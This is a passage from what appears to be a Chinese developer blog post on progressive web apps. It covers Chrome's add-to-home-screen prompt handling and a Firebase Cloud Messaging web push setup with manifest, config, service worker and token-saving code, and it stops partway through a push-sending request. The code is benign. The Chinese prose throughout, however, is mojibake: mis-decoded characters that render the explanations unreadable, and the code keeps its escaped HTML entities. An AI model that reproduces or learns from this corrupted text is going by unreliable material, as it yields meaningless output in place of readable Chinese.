é‡å°é€™ç¨®å‹•æ…‹çš„å¿«å–æä¾›å¹¾ç¨®ç­–ç•¥ï¼Œåˆ†åˆ¥æ˜¯ï¼šstaleWhileRevalidateã€cacheFirstã€networkFirstã€networkOnlyèˆ‡cacheOnlyï¼Œå…¶å¯¦çœ‹åå­—å°±å¯ä»¥å¤§æ¦‚ç†è§£ç­–ç•¥æ˜¯ä»€éº¼äº†ï¼Œæƒ³çŸ¥é“è©³ç´°çš„å…§å®¹å¯ä»¥åƒè€ƒå®˜æ–¹æ–‡ä»¶ï¼šWorkbox Strategiesã€‚\nç¸½ä¹‹è‡ªå¾æœ‰äº† Workbox ä¹‹å¾Œï¼ŒåŸºæœ¬ä¸Šå°±ä¸ç”¨è‡ªå·±æ‰‹å¯« SW äº†ï¼Œéƒ½é è‘—å®ƒæä¾›çš„ API ä»¥åŠåŠŸèƒ½å°±è¡Œäº†ï¼Œå°±å¯ä»¥è‡ªå‹•ç”¢ç”Ÿå‡ºç¬¦åˆéœ€æ±‚çš„ SWã€‚\nAdd to home screen banner æœ€å¾Œè¦ä¾†è«‡çš„æ˜¯ã€Œå®‰è£ PWAã€é€™ä¸€å¡Šï¼Œåœ¨ iOS Safari ä¸Šé¢åˆ¥ç„¡ä»–æ³•ï¼Œå°±åªèƒ½è‡ªå·±å«å‡ºé¸å–®ç„¶å¾Œé¸å–ã€ŒAdd to home screenã€ï¼Œå¯æ˜¯åœ¨ Android Chrome ä¸Šé¢ï¼Œå¦‚æœä½ ç¬¦åˆä¸€å®šçš„æ¢ä»¶ï¼ˆæœ‰è¨­ç½® mainfest.json ä»¥åŠæœ‰è¨»å†Š Service Workerï¼‰ï¼Œå°±æœƒè‡ªå‹•å¹«ä½ è·³å‡ºä¸€å€‹å¯æ„›çš„ Install bannerã€‚\nï¼ˆåœ–ç‰‡ä¾†è‡ªï¼šChanges to Add to Home Screen Behaviorï¼‰\næ ¹æ“š Chrome ç‰ˆæœ¬çš„ä¸åŒï¼Œè¡Œç‚ºä¹Ÿæœ‰æ‰€ä¸åŒã€‚\nåœ¨ Chrome 67ï¼ˆå«ï¼‰ä»¥å‰çš„ç‰ˆæœ¬ï¼Œå¦‚æœä½ åœ¨ beforeinstallprompt äº‹ä»¶è£¡é¢æ²’æœ‰ç‰¹åˆ¥ç”¨ preventDefault()ï¼Œæˆ–æ˜¯é¡¯å¼çš„å‘¼å«äº† prompt()ï¼Œå°±æœƒå‡ºç¾æœ€å·¦é‚Šé‚£å€‹é —å¤§çš„ A2HS bannerã€‚\nç„¶å¾Œåœ¨ Chrome 68ï¼ˆå«ï¼‰ä¹‹å¾Œçš„ç‰ˆæœ¬ï¼Œç„¡è«–ä½ åšäº†ä»€éº¼ï¼Œç³»çµ±éƒ½æœƒè‡ªå‹•å‡ºç¾é‚£å€‹ Mini-infobarï¼Œä½†å¦‚æœä½¿ç”¨è€…é—œæ‰çš„è©±ï¼Œè¦éš”ä¸‰å€‹æœˆæ‰æœƒå†å‡ºç¾ä¸€æ¬¡ï¼Œå¯¦åœ¨æ˜¯æœ‰å¤ ä¹…ã€‚\næ¥è‘—å‘¢ï¼Œä¸Šé¢é€™å…©å€‹ A2HS banner è·Ÿ Mini-infobarï¼Œä½¿ç”¨è€…é»æ“Šä¹‹å¾Œéƒ½æœƒå‡ºç¾æœ€å³é‚Šçš„ A2HS Dialogï¼Œæç¤ºä½¿ç”¨è€…è¦ä¸è¦å®‰è£ PWAã€‚\nä½†æ˜¯åœ¨ Chrome 68 ä»¥å¾Œï¼Œä½ ä¹Ÿå¯ä»¥åˆ©ç”¨ç¨‹å¼å»å‘¼å« beforeinstallprompt è£¡é¢æ‹¿åˆ°çš„ event.prompt() æŠŠé€™å€‹ dialog é¡¯ç¤ºå‡ºä¾†ã€‚\nè½èµ·ä¾†æœ‰é»è¤‡é›œå°å§ï¼Ÿ\nå…ˆä¾†ä»‹ç´¹ beforeinstallprompt é€™å€‹ event å¥½äº†ï¼Œé€™å€‹ event åœ¨ä¸€åˆ‡éƒ½æº–å‚™å°±ç·’ï¼Œç¢ºèªä½ æ»¿è¶³æ¢ä»¶å¯ä»¥é¡¯ç¤º prompt çš„æ™‚å€™æœƒè¢«è§¸ç™¼ï¼Œæœƒå‚³ä¾†ä¸€å€‹ eventï¼Œä½ å¯ä»¥é˜»æ­¢é¡¯ç¤º promptï¼ŒæŠŠé€™å€‹ event å­˜èµ·ä¾†ï¼š\n1 2 3 4 5 6 7 8 9 10 11 // æ­¤ç¯„ä¾‹ä¾†è‡ªä¸Šé¢çš„å®˜æ–¹æ–‡ä»¶ let installPromptEvent; window.addEventListener(\u0026#39;beforeinstallprompt\u0026#39;, (event) =\u0026gt; { // Prevent Chrome \u0026lt;= 67 from automatically showing the prompt event.preventDefault(); // Stash the event so it can be triggered later. installPromptEvent = event; // Update the install UI to notify the user app can be installed document.querySelector(\u0026#39;#install-button\u0026#39;).disabled = false; }); ç‚ºä»€éº¼è¦å­˜èµ·ä¾†å‘¢ï¼Ÿå› ç‚ºä½¿ç”¨è€…å¯èƒ½ä¸æƒ³ä¸€æ‰“é–‹ç¶²ç«™å°±çœ‹åˆ°é€™å€‹å½ˆçª—ï¼Œæˆ–è€…ä»–å¯èƒ½æ­£åœ¨çµå¸³çµæœä½ è·³é€™å€‹æ±è¥¿ä¾†å¹²æ“¾ä»–ï¼Œæ‰€ä»¥å…ˆæŠŠå®ƒå­˜èµ·ä¾†ï¼Œç­‰é©ç•¶çš„æ™‚æ©Ÿå†å‘¼å« installPromptEvent.prompt() ä¾†è·³å‡º Dialogã€‚\nä½†è¦æ³¨æ„çš„äº‹æƒ…æ˜¯ä½ ç›´æ¥å‘¼å« installPromptEvent.prompt() æ˜¯æ²’ç”¨çš„ï¼Œä½ å¿…é ˆè¦ within a user gestureï¼Œæ„æ€å°±æ˜¯ä½ è¦æ”¾åœ¨æŒ‰éˆ•çš„ click äº‹ä»¶ï¼ˆæˆ–å…¶ä»–ç”±ä½¿ç”¨è€…è§¸ç™¼çš„äº‹ä»¶ï¼‰è£¡æ‰æœ‰æ•ˆï¼Œç›´æ¥å‘¼å«æ˜¯æ²’æœ‰ç”¨çš„ï¼Œè€Œä¸”æœƒçœ‹åˆ° console è·³å‡ºéŒ¯èª¤è¨Šæ¯ã€‚\næˆ‘ä¹‹å‰ä¸€åº¦å¾ˆå¥½å¥‡å®ƒæ˜¯æ€éº¼åšåˆ¤æ–·çš„ï¼Œå¾Œä¾†ç™¼ç¾åŸä¾†æœ‰ event.isTrusted å¯ä»¥ç”¨ï¼Œå¯ä»¥åˆ¤æ–·ä¸€å€‹äº‹ä»¶æ˜¯ä¸æ˜¯è¢«ä½¿ç”¨è€…ä¸»å‹•è§¸ç™¼çš„ï¼Œåƒè€ƒè³‡æ–™ï¼šMDN - Event.isTrustedã€‚\nç¸½ä¹‹å‘¢ï¼Œå› ç‚ºåœ¨ä¸åŒç‰ˆæœ¬ä¸Šçš„ Chrome æœ‰ä¸åŒè¡Œç‚ºï¼Œæ‰€ä»¥æœ€å¾Œæˆ‘å€‘æ±ºå®šç”¨ä¸‹é¢çš„ç¨‹å¼ç¢¼é‡å°ä¸åŒç‰ˆæœ¬æœ‰ä¸åŒçš„åæ‡‰ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 // æŠŠ event å­˜èµ·ä¾† var installPromptEvent // è¦é¡¯ç¤º prompt çš„å»¶é² var showTime = 30 * 1000 window.addEventListener(\u0026#39;beforeinstallprompt\u0026#39;, function (e) { e.preventDefault() installPromptEvent = e var data = navigator.userAgent.match(/Chrom(e|ium)\\\\/([0-9]+)\\\\./) var version = (data \u0026amp;\u0026amp; data.length \u0026gt;= 2) ? parseInt(data[2], 10) : null if (version \u0026amp;\u0026amp; installPromptEvent.prompt) { // å»¶é²ä¸€æ®µæ™‚é–“æ‰é¡¯ç¤º prompt setTimeout(function() { // å¦‚æœ Chrome ç‰ˆæœ¬æ˜¯ 67ï¼ˆå«ï¼‰ä»¥ä¸‹ï¼Œå¯ä»¥ç›´æ¥å‘¼å« if (version \u0026lt;= 67) { installPromptEvent.prompt() return } // å¦å‰‡çš„è©±å¿…é ˆé€é user action ä¸»å‹•è§¸ç™¼ // é€™é‚Šå¹« #root åŠ ä¸Š event listenerï¼Œä»£è¡¨é»æ“Šè¢å¹•ä»»ä½•ä¸€è™•éƒ½æœƒé¡¯ç¤º prompt document.querySelector(\u0026#39;#root\u0026#39;).addEventListener(\u0026#39;click\u0026#39;, addToHomeScreen) }, showTime) } }); function addToHomeScreen(e) { if (installPromptEvent) { installPromptEvent.prompt() installPromptEvent = null document.querySelector(\u0026#39;#root\u0026#39;).removeEventListener(\u0026#39;click\u0026#39;, addToHomeScreen) } } å¦‚æœæ˜¯ 67 ä»¥ä¸‹ï¼Œç›´æ¥å‘¼å«å°±å¯ä»¥é¡¯ç¤º promptï¼Œå¦å‰‡çš„è©±é‚„è¦å†ä¸€æ­¥ï¼Œè¦åŠ å€‹ event listener æ‰è¡Œï¼Œè€Œæˆ‘å€‘ä¹Ÿé¸æ“‡å»¶é² 30 ç§’æ‰é¡¯ç¤ºã€‚\nå‡ºä¹æ„æ–™åœ°ï¼Œé€™æ¨£ä¸€å€‹å°æ”¹å‹•å¸¶ä¾†é©šäººçš„æˆé•·ï¼ŒåŸæœ¬ä¸€å¤©å¤§æ¦‚æ‰ 20ã€30 å€‹äººå®‰è£ PWAï¼Œç¶“éé€™æ¨£èª¿æ•´ä¹‹å¾Œç¬é–“è®Šæˆå…«åˆ°åå€ï¼Œçœ‹åˆ° GA çš„é‚£å€‹çµ±è¨ˆåœ–æˆ‘ä¹Ÿåš‡äº†ä¸€è·³ï¼Œæ²’æƒ³åˆ°æ•ˆæœé€™éº¼å¥½ã€‚\nèˆ‡å…¶ä¸€ç›´ç©æ¥µåœ°è¦åˆ¥äººå¿«é»å®‰è£ PWAï¼Œé‚„ä¸å¦‚åªè¦æ±‚çœŸçš„å°ä½ ç”¢å“æœ‰èˆˆè¶£ï¼ˆåœç•™è¶…é 30 ç§’é˜ï¼‰çš„äººã€‚\nç”¨ Firebase åš Web Push ç”¨åˆ°çš„è³‡æº Web Push æ¨æ’­åŠŸèƒ½ï¼Œé€™é™£å­å¾ˆå¸¸çœ‹åˆ°çš„ä¸€å€‹åŠŸèƒ½ï¼Œå¦‚æœä¸€é€²å…¥ç¶²ç«™ï¼Œçœ‹åˆ°ç¶²ç«™è¦æ±‚é¡¯ç¤ºé€šçŸ¥çš„æ¬Šé™ï¼Œå°±ä»£è¡¨é€™å€‹ç¶²ç«™æœ‰ç”¨é€™åŠŸèƒ½ï¼š\né‚£é€šå¸¸ï¼Œå¾ˆå¤šç¶²ç«™ UX è¨­è¨ˆä¸è‰¯ï¼Œåœ¨ä½¿ç”¨è€…æ ¹æœ¬å°±é‚„æä¸æ¸…æ¥šé€™ç¶²ç«™æ˜¯å¹¹éº»çš„æƒ…æ³ä¸‹å°±è·³é€šçŸ¥ï¼Œæ‰€ä»¥å¤§éƒ¨ä»½éƒ½ç›´æ¥æŒ‰å°é–äº†å§ XDï¼Ÿ\nç¸½ä¹‹ï¼Œåœ¨è¸©äº†å¹¾å€‹å‘ä»¥å¾Œï¼Œçµ‚æ–¼å®Œæ•´çš„å¯«å‡ºäº† Web Push çš„åŠŸèƒ½ã€‚\nå®Œæ•´æ˜¯æŒ‡æœƒåœ¨æ¡Œæ©Ÿã€å®‰å“æ‰‹æ©Ÿç™¼å‡ºæ¨æ’­é€šçŸ¥ï¼Œä¸¦ä¸”é»äº†æœƒé€²åˆ°æŒ‡å®šçš„é é¢ï¼ŒåŒæ™‚åœ¨ Firebase å„²å­˜ç™¼é€è¨Šæ¯çš„è¨˜éŒ„ã€‚\nç”¨åˆ°çš„è³‡æºå¦‚ä¸‹ï¼š\nè³‡æ–™åº«ï¼šFirebase Realtime Database æ¨æ’­åŠŸèƒ½ï¼šFirebase Cloud Messaging JS frameworkï¼šVue.js Web Push æ˜¯ PWA ä¸€å€‹å¾ˆé‡è¦çš„åŠŸèƒ½ï¼\nå–å¾— FCM é‡‘é‘° æœ¬ç¯‡æ˜¯ç”¨ Firebase çš„ Cloud MessagingåŠŸèƒ½ï¼ˆä»¥ä¸‹ç¨± FCMï¼‰ï¼Œå»å¯¦ä½œ Web Pushã€‚æ‰€ä»¥ç¬¬ä¸€æ­¥æ˜¯è¦å…ˆåœ¨ Firebase ä¸Šé–‹ä¸€å€‹å°ˆæ¡ˆã€‚\nä»¥ä¸‹æˆªåœ–æ‰€ç”¨åˆ°çš„ Firebase å°ˆæ¡ˆä¹‹å¾Œæœƒåˆªæ‰ï¼Œå„ç¨®é‡‘é‘°æœ€å¾Œéƒ½ä¸æœƒå­˜åœ¨ï¼Œç´”ç¤ºç¯„ç”¨ã€‚\né–‹å®Œå°ˆæ¡ˆå¾Œï¼Œè¦å–å¾—æ¨æ’­é‡‘é‘°ï¼Œæœ‰äº†é‡‘é‘°æ‰èƒ½å§‹ç”¨ FCM çš„åŠŸèƒ½ã€‚\né¦–å…ˆé€²åˆ° Firebase å¾Œå°ï¼Œé»é¸é½’è¼ªå¾Œï¼Œå†é»é¸å°ˆæ¡ˆè¨­å®šï¼š\né»æ“Š Cloud Messagingï¼š\né é¢å¾€ä¸‹æ‹‰ï¼Œæœƒçœ‹åˆ°ä¸€å€‹ã€Œç¶²è·¯è¨­å®šã€çš„å€å¡Šï¼Œæœ‰ä¸€å€‹ã€Œç”¢ç”Ÿé‡‘é‘°çµ„ã€çš„æŒ‰é‡‘ï¼ŒæŒ‰ä¸‹å»ï¼š\nå°±æœƒç”¢ç”Ÿä¸€çµ„ Web Push ç”¨çš„é‡‘é‘°ï¼Œå…ˆå­˜ä¸‹ä¾†ï¼ŒFirebase Config è£¡æœƒç”¨åˆ°ï¼š\næ–°å¢ manifest.jsonã€Firebase Config å–å¾—é‡‘é‘°å¾Œï¼Œç¬¬äºŒæ­¥å°±æ˜¯æ–°å¢ä¸€å€‹ manifest.json çš„æª”æ¡ˆï¼Œæª”æ¡ˆå…§å®¹å¤§æ¦‚å¦‚ä¸‹ï¼š\nmanifest.json 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 { \u0026#34;short_name\u0026#34;: \u0026#34;XXX\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;XXXXXX\u0026#34;, \u0026#34;icons\u0026#34;: [ { \u0026#34;src\u0026#34;: \u0026#34;./logo/logo192.png\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/png\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;192x192\u0026#34; }, { \u0026#34;src\u0026#34;: \u0026#34;./logo/logo512.png\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/png\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;512x512\u0026#34; }, { \u0026#34;src\u0026#34;:\u0026#34;./logo/maskable_icon.webp\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;512x512\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/webp\u0026#34;, \u0026#34;purpose\u0026#34;: \u0026#34;any maskable\u0026#34; } ], \u0026#34;start_url\u0026#34;: \u0026#34;/\u0026#34;, \u0026#34;background_color\u0026#34;: \u0026#34;#ffffff\u0026#34;, \u0026#34;display\u0026#34;: \u0026#34;standalone\u0026#34;, \u0026#34;scope\u0026#34;: \u0026#34;/\u0026#34;, \u0026#34;theme_color\u0026#34;: \u0026#34;#000000\u0026#34;, \u0026#34;gcm_sender_id\u0026#34;: \u0026#34;103953800507\u0026#34; } æœ€é‡è¦çš„æ˜¯é€™ä¸€è¡Œï¼š\n1 \u0026#34;gcm_sender_id\u0026#34;: \u0026#34;103953800507\u0026#34; é€™è¡Œä¸€å®šè¦æœ‰ï¼Œkeyã€value æ˜¯å›ºå®šçš„ï¼Œcopy è²¼ä¸Šå°±è¡Œã€‚\nFirebase Config å»ºç«‹ä¸€å€‹é¦–é çš„æª”æ¡ˆ index.htmlï¼Œåœ¨é å°¾çš„éƒ¨ä»½å¼•ç”¨ Firebase Configã€‚\nFirebase Config ä¸€æ¨£æ˜¯å¾Œå°æœ‰æä¾›ï¼Œé»å°é½’è¼ªï¼Œå†é»å°ˆæ¡ˆè¨­å®šå¾Œï¼Œæ¥è‘—é»ä»£è¡¨ Web çš„é‚£å€‹æŒ‰éˆ•ï¼š\nå°±æœƒå‡ºç¾ Config äº†ï¼š\ncopy ä»¥å¾Œè²¼åˆ° index.htmlï¼Œå¦å¤–ä¹Ÿä¸€ä½µè²¼ä¸Š FCM çš„å¼•ç”¨ï¼Œæ•´åˆå¾Œå¦‚ä¸‹ï¼š\nfcm-web-push-firebase-config.html 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;script src=\u0026#34;https://www.gstatic.com/firebasejs/5.9.1/firebase.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt; var config = { apiKey: \u0026#34;XXXXXXXXXX\u0026#34;, authDomain: \u0026#34;XXXXXXXXXX.firebaseapp.com\u0026#34;, databaseURL: \u0026#34;https://XXXXXXXXXX.firebaseio.com\u0026#34;, projectId: \u0026#34;XXXXXXXXXX\u0026#34;, storageBucket: \u0026#34;XXXXXXXXXX.appspot.com\u0026#34;, messagingSenderId: \u0026#34;XXXXXXXXXX\u0026#34; }; firebase.initializeApp(config); var database = firebase.database(); var messaging = firebase.messaging(); messaging.usePublicVapidKey(\u0026#39;XXXXXXXXXXXXXXXXXXXX\u0026#39;); \u0026lt;/script\u0026gt; æœ€å¾Œä¸€è¡Œçš„ï¼š\n1 messaging.usePublicVapidKey(\u0026#39;XXXXXXXXXXXXXXXXXXXX\u0026#39;); XXX å°±æ˜¯è¦æ›¿æ›æˆç¬¬ä¸€æ­¥æ‹¿åˆ°çš„ FCM é‡‘é‘°ã€‚\nå–å¾—ä½¿ç”¨è€…çš„ token ç°¡å–®ä¾†èªªï¼ŒWeb Push æ¨æ’­åŠŸèƒ½çš„æµç¨‹å¦‚ä¸‹ï¼š\nè¨»å†Š service-worker â†’ å‘ä½¿ç”¨è€…è¦æ±‚å…è¨±é€šçŸ¥æ¬Šé™ â†’ FCM ç”¢ç”Ÿé€™å€‹è£ç½®çš„ token â†’ token å¯«é€²è³‡æ–™åº« â†’ å¾å¾Œå°ä½¿ç”¨ Web Push â†’ Server ç™¼ Web Push åˆ°è£ç½®ä¸Š â†’ è£ç½®ä¸Šçš„ service worker æ¥æ”¶ â†’ service worker åŸ·è¡Œ notification token æ˜¯æ¯ä¸€å€‹è£ç½®æœƒæœ‰çš„ï¼Œä¹‹æ‰€ä»¥æœƒä»¥è£ç½®ç‚ºå–®ä½ï¼Œè€Œä¸æ˜¯ä»¥ä½¿ç”¨è€…ç‚ºå–®ä½ï¼Œæ˜¯å› ç‚ºæ¯ä¸€å€‹è£ç½®éƒ½å¯ä»¥è¨»å†Šservice workerï¼Œè€Œä¸”æ¯æ¬¡å­˜çš„ token éƒ½æœƒä¸åŒï¼Œæ‰€ä»¥ä¸€å€‹ä½¿ç”¨è€…åœ¨æ¡Œæ©Ÿçš„ Chromeã€Fireoxï¼Œæˆ–æ˜¯å®‰å“æ‰‹æ©Ÿçš„Chromeã€Firefoxï¼Œéƒ½æœ‰ä¸åŒçš„ tokenã€‚\nå‡è¨­ç‹å°æ˜åœ¨æ¡Œæ©Ÿçš„ Chromeã€Firefoxï¼Œéƒ½æŒ‰ä¸‹äº†å…è¨±é€šçŸ¥ï¼Œåœ¨å®‰å“æ‰‹æ©Ÿçš„ Chromeã€Firefox ä¹ŸæŒ‰äº†å…è¨±é€šçŸ¥ï¼Œé‚£ç•¶æˆ‘å€‘æŒ‰ä¸‹ç™¼é€æ¨æ’­å¾Œï¼Œç‹å°æ˜å°±æœƒåœ¨ 4 å€‹åœ°æ–¹æ”¶åˆ°ç›¸åŒçš„é€šçŸ¥ã€‚å› ç‚ºæ˜¯ç”¨è£ç½®ä¾†å€åˆ†çš„ã€‚\nIOS ç›®å‰é‚„ä¸æ”¯æ´ Web Pushã€‚\n2020.04.10æ›´æ–°ï¼š\nä»Šå¤©çœ‹åˆ° iZooto çš„ ä¸€ç¯‡æ–‡ç«  ä¸Šå¯«ï¼Œåœ¨æ¯”å°äº†ä¸€ä¸‹ Can I Use ä¸­çš„ service workers æ”¯æ´æƒ…æ³ï¼Œå¯ä»¥çœ‹åˆ° IOS11.3 é–‹å§‹æ”¯æ´ Service Workers äº†ï¼Œä½† Web Push çš„åŠŸèƒ½åªæ”¯æ´åœ¨ MACï¼Œå°šæœªæ”¯æ´åˆ° iPhone ä¸Šã€‚\næ–°å¢ sw.js ç”¨ Workbox æ–°å¢ä¸€å€‹ sw.js æª”æ¡ˆï¼ŒæŠŠ Firebase çš„ Config æ”¾é€²å»ï¼Œç¨‹å¼ç¢¼å¦‚ä¸‹ï¼š\nfcm-web-push-sw1.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 importScripts(\u0026#34;https://storage.googleapis.com/workbox-cdn/releases/3.6.3/workbox-sw.js\u0026#34;); importScripts(\u0026#39;https://www.gstatic.com/firebasejs/5.7.0/firebase-app.js\u0026#39;); importScripts(\u0026#39;https://www.gstatic.com/firebasejs/5.7.0/firebase-messaging.js\u0026#39;); workbox.clientsClaim(); workbox.skipWaiting(); workbox.precaching.precacheAndRoute([ // è¦å¿«å–çš„æª”æ¡ˆ ]); // firebase config var config = { apiKey: \u0026#34;XXXXXXXXXX\u0026#34;, authDomain: \u0026#34;XXXXXXXXXX.firebaseapp.com\u0026#34;, databaseURL: \u0026#34;https://XXXXXXXXXX.firebaseio.com\u0026#34;, projectId: \u0026#34;XXXXXXXXXX\u0026#34;, storageBucket: \u0026#34;XXXXXXXXXX.appspot.com\u0026#34;, messagingSenderId: \u0026#34;XXXXXXXXXX\u0026#34; }; firebase.initializeApp(config); var messaging = firebase.messaging(); å¦‚æœæ¨æ’­è£¡è¦æ”¾å…¬å¸çš„ Logoï¼Œé‚£ Logo çš„åœ–æª”å°±è¦å¯«é€²å¿«å–æª”æ¡ˆçš„æ¸…å–®è£¡ï¼Œåˆ°æ™‚æ¨æ’­æ‰æœ‰åœ–æª”å¯ä»¥é¡¯ç¤ºã€‚\nè¨»å†Š sw.jsã€å­˜ Cookiesã€å­˜ Firebase å¦‚æœæ‹¿åˆ°çš„ token ä¸å­˜åœ¨ Cookies è£¡ï¼Œç”¨ Cookies åˆ¤æ–·æ˜¯å¦æ‹¿é tokenï¼Œé‚£ä½¿ç”¨è€…å°±æœƒå­˜åˆ° 2 çµ„ä»¥ä¸Šçš„ tokenï¼Œåœ¨ç™¼æ¨æ’­æ™‚ï¼Œå°±æœƒæ”¶åˆ°ç›¸åŒçš„è¨Šæ¯å¤šæ¬¡ã€‚\nç•¶ç„¶ï¼Œå¦‚æœä½¿ç”¨è€…æ¸…é™¤äº†å¿«å–ï¼Œå°±æœƒæœ‰åˆ¥ç¨®æƒ…æ³ç™¼ç”Ÿï¼Œæœ€å¥½çš„æ–¹å¼é‚„æ˜¯è®“ä½¿ç”¨è€…ç™»å…¥æœƒå“¡å¾Œï¼Œå†å–å¾— tokenï¼ŒæŠŠ token è·Ÿæœƒå“¡ç¶ä¸€èµ·ï¼Œå°±ä¸æœƒæœ‰å¥‡å¥‡æ€ªæ€ªçš„æƒ…å½¢å‡ºç¾ã€‚\nä»¥ä¸‹ç‚º JS codeï¼š\nfcm-web-push-get-token.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 window.addEventListener(\u0026#39;load\u0026#39;, function() { if(\u0026#39;serviceWorker\u0026#39; in navigator) { navigator.serviceWorker.register(\u0026#39;/sw.js\u0026#39;) .then(function(reg) { // firebase methodsï¼Œç”¨åŒä¸€æ”¯sw.js messaging.useServiceWorker(reg); }) // è¨»å†Šå¤±æ•— .catch(function(err) { console.log(\u0026#39;error: \u0026#39;, err); }); } messaging.requestPermission().then(function() { // å…ˆåˆ¤æ–·cookiesæœ‰æ²’æœ‰tokenï¼Œæ²’æœ‰å†å–token var ckv = document.cookie.replace(/(?:(?:^|.*;\\\\s*)augustusWsPush\\s*\\=\\s*([^;]*).*$)|^.*$/, \u0026#34;$1\u0026#34;) || null; // cookiesä¸å­˜åœ¨ï¼Œè·Ÿä½¿ç”¨è€…è¦æ±‚é€šçŸ¥æ¬Šé™ if(ckv === null) { // æ‹¿åˆ°tokenï¼Œfirebase-messaging-sw.js å°±æœƒå­˜ Service Workers è£¡ messaging.getToken().then(function(currentToken) { // tokenå­˜è‡³firebase var id = currentToken.split(\u0026#39;:\u0026#39;)[0]; firebase.database().ref(\u0026#39;pushUsers/\u0026#39; + id).set({\u0026#39;token\u0026#39;: currentToken}); // tokenå­˜è‡³cookies document.cookie = \u0026#34;augustusWsPush=\u0026#34; + currentToken; }); } // cookies å·²å­˜åœ¨ï¼Œå¾ cookies å–å‡ºå¾Œå‚³è‡³ firebase else { var id = ckv.split(\u0026#39;:\u0026#39;)[0]; firebase.database().ref(\u0026#39;pushUsers/\u0026#39; + id).set({\u0026#39;token\u0026#39;: ckv}); } }).catch(function(err) { console.log(\u0026#39;ä½¿ç”¨è€…æœªå…è¨±é€šçŸ¥\u0026#39;, err); }); }); è£¡é¢æœ‰ä¸€è¡Œå¾ˆé‡è¦ï¼š\n1 messaging.useServiceWorker(xxx); é€™æ˜¯é€™æ¬¡è¸©åˆ°çš„å‘ã€‚\nå¦‚æœæ²’å¯«é€™è¡Œï¼Œå°±æœƒç™¼ç¾ç¶²ç«™å­˜äº† 2 å€‹ service workerï¼Œåˆ†åˆ¥æ˜¯ Firebase çš„ï¼Œä»¥åŠæˆ‘å€‘è‡ªå·±çš„ã€‚é€™è¡Œå¯ä»¥è®“ FCM åªå­˜æˆ‘å€‘è¨»å†Šçš„ sw.jsï¼Œæ‰å¯ä»¥åœ¨ç”¨ FCM æ¨æ’­æ™‚ï¼Œé †åˆ©çš„åŸ·è¡Œæ¨æ’­åŠé»æ“Šå¾Œé–‹å•ŸæŒ‡å®šçš„é é¢ã€‚\næˆåŠŸçš„è©±ï¼Œé–‹å•Ÿ index.htmlï¼Œåœ¨é–‹ç™¼äººå“¡å·¥å…·çš„ Application â†’ Service Workersï¼Œå°±æœƒçœ‹è¦‹è¨»å†Šäº† sw.js æª”æ¡ˆï¼š\nè¨»å†Š sw.js åªèƒ½åœ¨ https ä¸‹ï¼Œå› æ­¤ç¶²åŸŸå¿…é ˆæœ‰S SLï¼Œä¸ç„¶æœƒè¨»å†Šå¤±æ•—ã€‚\n1 messaging.requestPermission() é€™è¡Œæœƒè·Ÿä½¿ç”¨è€…è¦å…è¨±é€šçŸ¥ï¼Œä½¿ç”¨è€…æŒ‰ä¸‹å…è¨±å¾Œ\n1 messaging.requestPermission() é€™è¡Œå°±æœƒç”¢ç”Ÿ FCM çš„ tokenï¼Œä¹‹å¾Œå°±æ˜¯å­˜é€² Firebase è·Ÿ Cookiesã€‚\nFirebase ä¸Šæœƒçœ‹åˆ°ä»¥ä¸‹ï¼š\nä¹‹å¾Œåªè¦è·‘å€‹è¿´åœˆï¼Œå°±å¯ä»¥ä¸€å€‹å€‹å»ç™¼é€ Web Pushã€‚\nç™¼é€ Web Push é€™é‚Šæ–°å¢ä¸€å€‹ admin.html ä¾†ç•¶åšç™¼é€ Web Push çš„å¾Œå°ä»‹é¢ï¼Œç›´æ¥ç”¨ Vue.js æŠ“æ¯å€‹ input çš„å€¼ã€‚\nWeb Push å¦‚æœè¦åˆ¤æ–·æˆæ•ˆï¼Œç›´æ¥ç”¨ Google Analytics çš„ utm åƒæ•¸å°±å¯ä»¥äº†ï¼Œæ‰€ä»¥å¾Œå°æ¬„ä½æœ‰çµ¦ utm ç”¨çš„ 3 å€‹ä¸»è¦åƒæ•¸ã€‚\nä¸å«æ¨£å¼çš„åŸå§‹ç¢¼æ–‡æœ«æœƒé™„ä¸Š GitHub ç¶²å€ã€‚\nåœ¨ç™¼é€ Web Push æ™‚ï¼Œé‚„è¦å¡«å…¥ä¼ºæœå™¨çš„é‡‘é‘°ï¼Œé€™ä¹Ÿæ˜¯å¾ Firebase å¾Œå°å¯ä»¥æ‹¿åˆ°ã€‚é»å°é½’è¼ª â†’ å°ˆæ¡ˆè¨­å®š â†’ Cloud Messagingï¼Œç¬¬ä¸€å€‹ã€Œä¼ºæœå™¨é‡‘é‘°ã€çš„å€¼å°±æ˜¯äº†ï¼š\nç™¼é€ Web Push çš„ JS å¦‚ä¸‹ï¼Œå¯«åœ¨ admin.html è£¡ï¼š\nfcm-web-push-trigger.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 var notification = { \u0026#39;title\u0026#39;: \u0026#39;web pushæ¨™é¡Œ\u0026#39;, \u0026#39;body\u0026#39;: \u0026#39;web pushå…§æ–‡\u0026#39;, \u0026#39;badge\u0026#39;: \u0026#39;logoåœ–æª”è·¯å¾‘\u0026#39;, \u0026#39;icon\u0026#39;: \u0026#39;logoåœ–æª”è·¯å¾‘\u0026#39;, \u0026#39;click_action\u0026#39;: \u0026#39;https://www.domain.com.tw\u0026#39;, \u0026#39;data\u0026#39;: { \u0026#39;url\u0026#39;: \u0026#39;https://www.domain.com.tw\u0026#39; } }; fetch(\u0026#39;https://fcm.googleapis.com/fcm/send\u0026#39;, { \u0026#39;method\u0026#39;: \u0026#39;POST\u0026#39;, 